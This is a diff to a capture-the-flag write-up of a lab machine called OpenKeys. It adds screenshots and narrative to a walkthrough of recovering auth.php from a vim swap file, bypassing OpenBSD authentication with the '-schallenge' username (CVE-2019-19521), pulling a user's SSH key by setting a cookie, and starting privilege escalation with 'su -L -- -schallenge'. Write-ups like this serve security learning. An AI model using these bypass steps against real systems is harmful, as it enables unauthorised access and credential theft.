@@ -2,7 +2,7 @@
 
 ## Overview
 
-![](https://github.com/zweilosec/htb-writeups/tree/e94d1b31b99c3273b51c6375ae8af67badcc811f/linux-machines/medium/machine%3E.infocard.png)
+![](../../.gitbook/assets/0-openkeys-infocard.png)
 
 Short description to include any strange things to be dealt with
 
@@ -101,7 +101,13 @@ Nmap done: 1 IP address (1 host up) scanned in 717.23 seconds
 
 Only two ports open, 22 - SSH and 80 - HTTP
 
+![](../../.gitbook/assets/1-port-80.png)
+
 HTTP leads to login page
+
+![](../../.gitbook/assets/2-dirbuster%20%281%29.png)
+
+![](../../.gitbook/assets/2-includes.png)
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
@@ -133,6 +139,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 There wasn't anything to do with the login page so I ran gobuster on it, there was am /includes folder; downloaded auth.php and auth.php.swp
 
+![](../../.gitbook/assets/2-auth-php-swp.png)
+
 found potential username jennifer in swap file
 
 .swp file is a vim recovery file, can get the file contents back from: [https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file](https://superuser.com/questions/204209/how-can-i-recover-the-original-file-from-a-swp-file)
@@ -141,6 +149,10 @@ found potential username jennifer in swap file
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ vim -r auth.php.swp
 ```
+
+![](../../.gitbook/assets/2-auth-php-swp-recovery.png)
+
+recovered `/var/www/htdocs/includes/auth.php` using the `.swp` file
 
 ```php
 <?php
@@ -185,7 +197,11 @@ function is_active_session()
 }
 ```
 
+![](../../.gitbook/assets/3-found-check_auth.png)
+
 escapeshellcmd ../auth\_helpers/check\_auth
+
+![](../../.gitbook/assets/3-check_auth.png)
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
@@ -194,6 +210,8 @@ check_auth: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically 
 ```
 
 googled `/usr/libexec/ld.so` - [https://man.netbsd.org/libexec/ld.so.1](https://man.netbsd.org/libexec/ld.so.1)
+
+![](../../.gitbook/assets/3-ld-so.png)
 
 found exploit for this file on openbsd - [https://www.exploit-db.com/exploits/47780](https://www.exploit-db.com/exploits/47780)
 
@@ -345,9 +363,23 @@ So the system was vulnerable, but I was still not sure how to exploit this to ga
 
 ### Finding user creds
 
-pics above
+ CVE-2019-19521: Authentication bypass
 
-after seeing that it said no key specified for that user, I tried multiple ways of specifying the only username I had found. I was able to give the name in the cookie and get a response back!
+> This is the second piece of the puzzle: if an attacker specifies the username "-schallenge" \(or "-schallenge:passwd" to force a passwd-style authentication\), then the authentication is automatically successful and therefore bypassed.
+
+![](../../.gitbook/assets/4-schallenge.png)
+
+After logging in with the username and password `-schallenge` I got this page.  `sshkey.php` sounded very interesting.
+
+Since it did not like this username, I tried different methods of specifying another username.  The only possibility I had at this time was `jennifer` \(and this still felt like a stretch since I had only seen it in the header of that swap file...\)
+
+![](../../.gitbook/assets/4-schallenge-test-jennifer.png)
+
+Putting the username in the cookie seemed like a good bet, and logging in with the bypass and doing this gave me a redirect on the login page
+
+![](../../.gitbook/assets/4-schallenge-jennifer.png)
+
+after getting a valid logged in PHP session ID, I tried multiple ways of specifying the only username I had found. I was able to give the name in the cookie on the `sshkey.php` page and get a response back!
 
 ```text
 HTTP/1.1 200 OK
@@ -406,6 +438,12 @@ qtQ5OEFcmVIA/VAAAAG2plbm5pZmVyQG9wZW5rZXlzLmh0Yi5sb2NhbAECAwQFBgc=<br />
 
 The service gave me an SSH key for the user `jennifer`!
 
+![](../../.gitbook/assets/4-schallenge-jennifer-key.png)
+
+It was easier to copy from the web browser
+
+
+
 ```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ ssh jennifer@10.10.10.199 -i jennifer.key 
@@ -417,9 +455,14 @@ It is required that your private key files are NOT accessible by others.
 This private key will be ignored.
 Load key "jennifer.key": bad permissions
 jennifer@10.10.10.199's password:                                                                    
+
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ chmod 600 jennifer.key 
+```
 
+Always use protection when reusing other people's keys.
+
+```text
 ┌──(zweilos㉿kali)-[~/htb/openkeys]
 └─$ ssh jennifer@10.10.10.199 -i jennifer.key
 Last login: Thu Nov 12 17:47:14 2020 from 10.10.14.223
@@ -479,7 +522,7 @@ openkeys$ cat user.txt
 
 ## Path to Power \(Gaining Administrator Access\)
 
-### Enumeration as User
+### Enumeration as \`jennifer\`
 
 ```text
 openkeys$ su -L -- -schallenge
